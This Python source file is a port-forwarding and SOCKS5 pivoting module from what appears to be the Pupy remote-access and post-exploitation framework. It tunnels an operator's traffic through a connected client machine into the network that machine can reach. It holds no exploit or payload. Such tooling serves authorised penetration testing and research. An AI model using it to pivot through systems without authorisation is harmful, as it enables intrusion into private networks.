# -*- coding: utf-8 -*-

import sys, os
from pupylib.PupyModule import *
from pupylib.PupyJob import PupyJob
from threading import Thread

try:
    import asyncoroproxy
except ImportError:
    packages_all = os.path.abspath(
        os.path.join(
            os.path.dirname(__file__), '..', 'packages', 'all'
        )
    )

    sys.path.append(packages_all)
    import asyncoroproxy

__class_name__ = 'Forward'

@config(cat='network', tags=['forward', 'pivot'])
class Forward(PupyModule):
    ''' Forward local/remote network points '''
    is_module = False
    dependencies = {
        'all': [ 'asyncoro', 'asyncoroproxy' ],
        'windows': [
            'pywintypes', 'win32file', 'win32event', 'winerror'
        ]
    }

    def init_argparse(self):
        parser = PupyArgumentParser(
            prog='forward', description=self.__doc__
        )

        protocols = parser.add_mutually_exclusive_group(required=False)
        protocols.add_argument(
            '-F', '--forward', action='store_true', default=False, help='Port forwarding'
        )
        protocols.add_argument(
            '-5', '--socks5', action='store_true', default=False, help='Socks5 server (default)'
        )

        actions = parser.add_mutually_exclusive_group(required=True)
        actions.add_argument(
            '-CL', '--cancel-local',
            help='Cancel local forwarding ([LHOST:]LPORT)'
        )
        actions.add_argument(
            '-CR', '--cancel-remote',
            help='Cancel remote forwarding ([RHOST:]RPORT)'
        )

        actions.add_argument(
            '-l', '--list',
            default=False, action='store_true',
            help='List forwardings for current client'
        )

        actions.add_argument(
            '-L', '--local', help='Local port forwarding ([LHOST]:LPORT[:RHOST[:RPORT]])'
        )

        actions.add_argument(
            '-R', '--remote', help='Remote port forwarding ([RHOST:]RPORT[:LHOST[:LPORT]])'
        )

        self.arg_parser = parser

    def run(self, args):
        state = self.client.conn.single(asyncoroproxy.PairState)

        if args.list:
            if not state.local:
                self.info('Forwarding was not enabled')
                return

            for stype, name, acceptors in state.local.control.list(filter_by_local_id=state.local_id):
                for pair, kwargs, address in acceptors:
                    self.success('L: {} {}{}'.format(
                        name, address, '/ {}'.format(kwargs) if kwargs else '')
                    )

            for stype, name, acceptors in state.remote.control.list():
                for pair, kwargs, address in acceptors:
                    self.success('R: {} {}{}'.format(
                        name, address, '/ {}'.format(kwargs) if kwargs else '')
                    )
        elif args.local or args.remote or args.cancel_local or args.cancel_remote:
            if len(self.job.pupymodules) > 1 and (args.local or args.cancel_local):
                raise ValueError('Adding local forward for multiple modules is not supported')

            if not (args.socks5 or args.forward):
                args.socks5 = True

            if args.cancel_local or args.cancel_remote:
                config = args.cancel_local or args.cancel_remote
                parts = config.split(':')
                lhost = '127.0.0.1'
                lport = 1080
                if len(parts) == 1:
                    lport, = parts
                elif len(parts) == 2:
                    lhost, lport = parts
                else:
                    raise ValueError('Invalid configuration: {}'.format(config))
                lport = int(lport)

            else:
                config = args.local or args.remote
                parts = config.split(':')
                lport, lhost, rport, rhost = 1080, '127.0.0.1', 1080, '127.0.0.1'

                if len(parts) == 1:
                    lport = int(parts[0])
                elif len(parts) == 2:
                    lport, rhost = parts
                    lport = int(lport)
                elif len(parts) == 3:
                    try:
                        rport = int(parts[2])
                        lport, rhost = parts[:2]
                        lport = int(lport)
                    except:
                        lhost, lport, rhost = parts
                        lport = int(lport)
                elif len(parts) == 4:
                    lhost, lport, rhost, rport = parts
                    lport = int(lport)
                    rport = int(rport)
                else:
                    raise ValueError('Invalid configuration: {}'.format(config))

            manager = self.client.pupsrv.single(asyncoroproxy.ManagerState)
            rasyncoroproxy = self.client.conn.modules.asyncoroproxy

            if args.cancel_local or args.cancel_remote:
                local, remote, local_id, remote_id = state.get()

                if not local:
                    self.info('Forwarding was not enabled')
                    return

                if args.cancel_local:
                    manager = local
                else:
                    manager = remote

                stype = None
                if args.socks5:
                    stype = manager.SOCKS5
                elif args.forward:
                    stype = manager.FORWARD

                try:
                    manager.control.unbind(stype, (lhost, lport))
                    self.success('Forwarding {} removed'.format(lhost, lport))
                except Exception, e:
                    self.error('Removal failed: {}'.format(e))

                return


            if not manager.manager:
                manager.manager = asyncoroproxy.Manager()
                self.client.pupsrv.register_cleanup(manager.cleanup)


            if not state.local:
                state.local = manager.manager
                state.remote = rasyncoroproxy.Manager()
                state.local_id, state.remote_id = state.local.pair(state.remote)

                self.client.conn.register_local_cleanup(state.cleanup)
                self.client.conn.register_remote_cleanup(
                    state.remote.control.shutdown
                )

            local, remote, local_id, remote_id = state.get()

            if args.local:
                manager = local
                id = local_id
                networkaddress = asyncoroproxy.NetworkAddress
            else:
                manager = remote
                id = remote_id
                networkaddress = rasyncoroproxy.NetworkAddress

            try:
                if args.socks5:
                    manager.control.bind(
                        manager.SOCKS5,
                        id,
                        networkaddress(
                            (lhost, lport)
                        )
                    )
                elif args.forward:
                    manager.control.bind(
                        manager.FORWARD,
                        id,
                        networkaddress(
                            (lhost, lport)
                        ),
                        connect=networkaddress(
                            (rhost, rport)
                        )
                    )

                self.success('Forwarding added')
            except Exception, e:
                self.error('Forwarding failed: {}'.format(e))
